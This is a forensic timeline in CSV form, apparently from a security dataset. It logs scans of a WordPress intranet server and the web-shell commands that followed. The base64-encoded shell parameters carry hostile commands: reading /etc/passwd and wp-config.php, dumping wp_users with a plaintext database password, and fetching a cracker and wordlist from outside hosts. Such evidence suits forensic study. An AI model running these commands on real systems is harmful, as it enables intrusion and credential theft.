date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
01/18/2022,12:17:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28569] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28569] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (   cd / && run-parts --report /etc/cron.hourly),Cron ran: cd / && run-parts --report /etc/cron.hourly for user: root pid: 28570,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:17:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28569] pam_unix(cron:session): session closed for user root,[CRON  pid: 28569] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sshd  pid: 28573] Did not receive identification string from 172.17.130.196 ...,[sshd  pid: 28573] Did not receive identification string from 172.17.130.196 port 52000,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /HNAP1 HTTP/1.1 from: 172.17.130.196,http_request: GET /HNAP1 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /HNAP1 HTTP/1.1 from: 172.17.130.196,http_request: GET /HNAP1 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196,http_request: GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196,http_request: GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /sdk HTTP/1.1 from: 172.17.130.196,http_request: POST /sdk HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /sdk HTTP/1.1 from: 172.17.130.196,http_request: POST /sdk HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6134; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 9130; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,HEAD / HTTP/1.1 from: 172.17.130.196,http_request: HEAD / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 223; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zoom HTTP/1.1 from: 172.17...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zoom HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.1...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zt HTTP/1.1 from: 172.17.1...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zt HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:00,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 9186; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:00,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 172.17.130.196,http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 37159; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:01,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1280; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:04,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZC...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506787; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:06,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507161; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:08,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507474; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:09,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcC...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507330; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:11,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcy...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 508455; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506846; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:16,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507443; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:17,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507947; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:19,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506757; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:21,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscy...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 569644; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:23,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 509003; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:25,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507795; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:27,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507331; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28622] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28622] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:39:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28622] pam_unix(cron:session): session closed for user root,[CRON  pid: 28622] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:39:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/syst...,Cron ran: [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi for user: root pid: 28623,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:38:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506717; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:32,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.35.118,http_request: GET / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:38:32,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /favicon.ico HTTP/1.1 from: 10.35.35.118,http_request: GET /favicon.ico HTTP/1.1 from: 10.35.35.118 code: 404 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 396; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:03,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 507588; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:06,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506717; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:23,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Starting Clean php session files...,[systemd  pid: 1] Starting Clean php session files...,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:39:24,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started Clean php session files.,[systemd  pid: 1] Started Clean php session files.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:39:11,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506876; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:39:45,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:41:33,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 10.35.35.118,http_request: GET /?p=5 HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 37780; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:46:16,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5471; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:46:17,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:47:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:47:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5535; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:47:54,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.35.118,http_request: GET / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.33.116,http_request: GET / HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1490; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23190; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
